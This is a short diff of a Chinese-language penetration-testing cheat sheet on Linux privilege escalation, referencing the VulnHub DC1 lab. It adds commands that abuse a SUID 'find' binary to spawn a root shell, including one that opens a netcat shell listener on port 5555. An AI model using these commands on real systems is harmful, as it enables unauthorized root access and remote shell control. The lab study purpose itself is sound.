@@ -45,9 +45,15 @@ find / -user root -perm -4000 -print 2>/dev/null
 find / -user root -perm -4000 -exec ls -ldb {} ;
 ```
 
+![image](./img/vulnhub-dc1-13.png)
 
+#### find
 
-
+案例可见DC1的提权
+```bash
+find aaa - exec netcat -lvp 5555 -e /bin/sh \ # 反弹
+find . -exec /bin/sh \; # 直接提权
+```
 
 
 
